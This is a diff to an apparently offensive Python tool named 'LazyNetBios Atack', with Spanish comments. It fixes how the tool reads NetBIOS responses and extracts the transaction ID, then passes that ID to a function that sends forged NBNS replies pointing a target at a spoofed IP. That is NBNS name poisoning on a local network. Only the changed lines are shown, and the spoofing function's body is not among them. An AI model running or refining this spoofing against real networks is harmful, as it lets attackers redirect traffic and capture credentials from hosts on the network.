@@ -60,9 +60,10 @@ def check_netbios(ip):
             print(f"    TTL: {rr.TTL}")
             print(f"    LENGTH: {rr.RDLENGTH}")
             print(f"    ADDR: {rr.RDATA}")
+        return nbns_response
     else:
         print(f"[-] No NetBIOS response from {ip}")
-    return response
+        return None
 
 # Función para enviar una respuesta NBNS falsa
 def send_nbns_spoof(target_ip, target_name, spoof_ip, trans_id):
@@ -114,7 +115,7 @@ if __name__ == "__main__":
     ██║     ███████║  ███╔╝  ╚████╔╝ ██║   ██║██║ █╗ ██║██╔██╗ ██║
     ██║     ██╔══██║ ███╔╝    ╚██╔╝  ██║   ██║██║███╗██║██║╚██╗██║
     ███████╗██║  ██║███████╗   ██║   ╚██████╔╝╚███╔███╔╝██║ ╚████║
-    ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝
+    ╚══════╝╚═╝  ╚══════╝   ╚═╝    ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝
     [*] Iniciando: LazyNetBios Atack [;,;]
     """    
     print(BANNER)       
@@ -137,7 +138,7 @@ if __name__ == "__main__":
         check_arp(ip)
         netbios_response = check_netbios(ip)
         if netbios_response:
-            trans_id = netbios_response[NBNSQueryResponse].NAME_TRN_ID
+            trans_id = netbios_response.NAME_TRN_ID
             target_name = b'*' + b'\x00'*15
             print(f"[*] Spoofing {ip}...")
             send_nbns_spoof(ip, target_name, spoof_ip, trans_id)
